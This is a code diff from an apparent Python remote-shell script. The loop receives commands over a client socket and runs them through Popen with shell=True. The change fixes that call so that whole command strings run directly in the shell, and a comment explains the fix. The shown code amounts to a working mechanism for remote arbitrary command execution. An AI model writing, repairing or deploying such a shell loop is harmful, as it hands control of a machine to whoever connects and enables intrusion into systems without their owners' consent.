@@ -25,7 +25,10 @@ while command != "exit":
 		command = (clientSocket.recv(4064)).decode()
 	else:
 		try:
-			proc = Popen(command.split(" "), stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
+			#proc = Popen(command.split(" "), stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
+			#Because we have shell=True, we don't want to split; this flag takes in a single command string
+			# and runs it in the shell!
+			proc = Popen(command, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
 			result, err = proc.communicate()
 			if(err != ""):
 				print(err)
